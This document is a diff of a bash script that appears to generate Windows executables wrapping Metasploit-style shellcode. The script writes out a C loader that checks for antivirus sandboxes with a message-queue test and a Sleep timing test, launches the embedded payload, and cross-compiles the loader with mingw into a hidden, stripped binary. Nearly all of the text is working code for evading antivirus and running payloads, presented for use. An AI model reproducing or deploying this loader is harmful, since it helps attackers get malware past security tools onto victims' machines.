@@ -105,21 +105,12 @@ fi
 
 # Verify stage 1 succeeded
 if [ ! -f payload.c ]; then
-	echo -e "\e[0;32mError: Failed to generate the payload blob!\e[0m" 1>&2
+	echo -e "\e[0;32mError: Failed to generate the payload blob\e[0m" 1>&2
 	exit 1
 fi
 
-# Build loader C source file from template and stage 1 payload blob
-echo -e "$tag Building loader..."
-echo "#include <windows.h>" >> final.c
-echo "#include <stdio.h>" >> final.c
-echo "unsigned char micro[]=" >> final.c
-cat buffer.c >> final.c
-echo "int check(void){MSG msg;DWORD tc;PostThreadMessage(GetCurrentThreadId(),WM_USER+2,23,42);if(!PeekMessage(&msg,(HWND)-1,0,0,0)) return -1;if(msg.message!=WM_USER+2||msg.wParam!=23||msg.lParam!=42) return -1;tc=GetTickCount();Sleep(650);if(((GetTickCount()-tc)/300)!=2) return -1;return 0;}" >> final.c
-echo "int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR szCmdLine,int iCmdShow){CreateWindow(\"\",\"\",WS_DISABLED,0,0,0,0,NULL,NULL,hInstance,NULL);if(check()==-1) return 0;((void (*)())micro)();Sleep(5000);return 0;}" >> final.c
-
 ###
-### Breakdown of C above loader stub
+### Breakdown of C loader stub below
 ###
 # #include <windows.h>
 # #include <stdio.h>
@@ -130,68 +121,84 @@ echo "int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR szCmd
 #	MSG msg;
 #	DWORD tc;
 #
-#	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42); // Post a message to the thread that usually indicates the application has finished initializing
-#	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0)) return -1; // Read the message back
-#	if (msg.message != WM_USER + 2 || msg.wParam != 23 || msg.lParam != 42) return -1; // Verify that the message returned is the same as the message posted
-#	tc = GetTickCount(); // Store current tick count for verification of sleep() call
-#	Sleep(650); // Sleep for 650ms (possibly outrunning the sandbox's lifetime)
-#	if(((GetTickCount() - tc) / 300) != 2) return -1; // Verify sleep() call actually slept (and AV didn't nop the sleep() function)
+#	// Post a message to the thread that usually indicates the application has finished initializing
+#	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
+#
+#	// Read the message back, exiting if the call fails
+#	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0)) return -1;
+#
+#	// Verify that the message returned is the same as the message posted
+#	if (msg.message != WM_USER + 2 || msg.wParam != 23 || msg.lParam != 42) return -1;
+#
+#	// Store current tick count for verification of sleep() call
+#	tc = GetTickCount();
+#
+#	// Sleep for 650ms (possibly outrunning the sandbox's lifetime)
+#	Sleep(650);
+#
+#	// Verify sleep() call actually slept (and AV didn't nop the sleep() function)
+#	if(((GetTickCount() - tc) / 300) != 2) return -1;
+#
 #	return 0;
 # }
 #
 # int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR szCmdLine, int iCmdShow) {
-#	CreateWindow(\"\",\"\", WS_DISABLED, 0, 0, 0, 0, NULL, NULL, hInstance, NULL); // Create the main window (all Windows applications have one) as hidden by default so it doesn't flash on-screen quickly
-#	if(check() == -1) return 0; // Verify that we're not running in an AV sandbox
-#	((void (*)())micro)(); // Launch payload
+#	// Create the main window (all Windows applications have one) as hidden by default so it doesn't flash on-screen quickly
+#	CreateWindow(\"\",\"\", WS_DISABLED, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
+#
+#	// Verify that we're not running in an AV sandbox
+#	if(check() == -1) return 0;
+#
+#	// Launch payload
+#	((void (*)())micro)();
+#
 #	Sleep(5000);
 #	return 0;
 # }
+
+# Build loader C source file from template and stage 1 payload blob
+echo -e "$tag Building loader..."
+echo "#include <windows.h>" >> final.c
+echo "#include <stdio.h>" >> final.c
+echo "unsigned char micro[]=" >> final.c
+cat buffer.c >> final.c
+echo "int check(void){MSG msg;DWORD tc;PostThreadMessage(GetCurrentThreadId(),WM_USER+2,23,42);if(!PeekMessage(&msg,(HWND)-1,0,0,0)) return -1;if(msg.message!=WM_USER+2||msg.wParam!=23||msg.lParam!=42) return -1;tc=GetTickCount();Sleep(650);if(((GetTickCount()-tc)/300)!=2) return -1;return 0;}" >> final.c
+echo "int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR szCmdLine,int iCmdShow){CreateWindow(\"\",\"\",WS_DISABLED,0,0,0,0,NULL,NULL,hInstance,NULL);if(check()==-1) return 0;((void (*)())micro)();Sleep(5000);return 0;}" >> final.c
+
+# Verify stage 2 succeeded
+if [ ! -f final.c ]; then
+        echo -e "\e[0;32mError: Failed to build C source file\e[0m" 1>&2
+        exit 1
+fi
 
 # Compilation
 echo -e "$tag Compiling...\e[0;31m"
 
 if [[ $pay != *x64* ]]; then
-	i586-mingw32msvc-gcc -Wall -o tmp.o -c final.c
+	i586-mingw32msvc-gcc final.c -o $out -mwindows -s
 else
-	i686-w64-mingw32-gcc -Wall -o tmp.o -c final.c
+	i686-w64-mingw32-gcc final.c -o $out -mwindows -s
 fi
 
-if [ -e "tmp.o" ]; then
-	if [[ $pay != *x64* ]]; then
-		i586-mingw32msvc-gcc -o $out tmp.o -s -lcomctl32 -Wl,--subsystem,windows
-	else
-		i686-w64-mingw32-gcc -o $out tmp.o -s -lcomctl32 -Wl,--subsystem,windows
-	fi
-
-	if [ -e "$out" ]; then
-		if [[ $pay != *x64* ]]; then
-			i586-mingw32msvc-strip --strip-debug $out
-		else
-			i686-w64-mingw32-strip --strip-debug $out
-		fi
-
-		# Cleanup
-		if [ "$1" != "noclean" ]; then
-			echo -e "$tag Cleaning up..."
-			rm -f payload.c
-			rm -f buffer.c
-			rm -f final.c
-			rm -f tmp.o
-			cd ..
-			rmdir .msfpayload
-		else
-			echo -e "$tag noclean flag detected, preserving files in .msfpayload"
-		fi
-
-		sumx=`sha1sum "$out" | cut -d " " -f1`
-		echo -e "$tag Payload saved to \e[0;33m$out\e[0m!"
-		echo -e "$tag Checksum: \e[0;34m$sumx\e[0m"
-		echo -e "\e[1;35mFinished. Have a nice day. :)\e[0m"
-	else
-		echo -e "\e[0;31mFailed to link loader\e[0m"
-		exit 1
-	fi
+if [ -e "$out" ]; then
+	sumx=`sha1sum "$out" | cut -d " " -f1`
+	echo -e "$tag Payload saved to \e[0;33m$out\e[0m!"
+	echo -e "$tag Checksum: \e[0;34m$sumx\e[0m"
+	echo -e "\e[1;35mFinished. Have a nice day. :)\e[0m"
 else
-	echo -e "\e[0;31m Failed to assemble and compile loader\e[0m"
+	echo -e "\e[0;31mFailed to compile payload vector\e[0m"
 	exit 1
+fi
+
+# Cleanup
+if [ "$1" != "noclean" ]; then
+	echo -e "$tag Cleaning up..."
+	rm -f payload.c
+	rm -f buffer.c
+	rm -f final.c
+	rm -f tmp.o
+	cd ..
+	rmdir .msfpayload
+else
+	echo -e "$tag noclean flag detected, preserving files in .msfpayload"
 fi
